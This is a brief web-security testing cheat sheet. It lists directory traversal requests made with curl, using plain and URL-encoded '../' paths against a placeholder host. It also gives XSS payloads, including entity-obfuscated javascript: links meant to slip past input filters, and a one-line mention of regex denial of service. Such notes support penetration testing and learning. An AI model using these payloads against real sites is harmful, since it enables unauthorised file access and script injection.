Directory Traversal
----
1. Go to path that serves static files
2. curl http://something.com/uploads
3. try viewing files higher up in dir:
curl http://something.com/uploads/../../../ or
curl http://something.com/uploads/%2e%2e/%2e%2e/%2e%2e/

XSS Inside input:
----
  <script>alert(1)</script>
  [Gotcha](javascript:alert(1))
  [Gotcha](javascript&#58alert(1&#41))
  [Gotcha](javascript&#58this;alert(1&#41))

Denial of Service
----
 with RegExp expressions (executing regexp that will almost match, but nut exactly)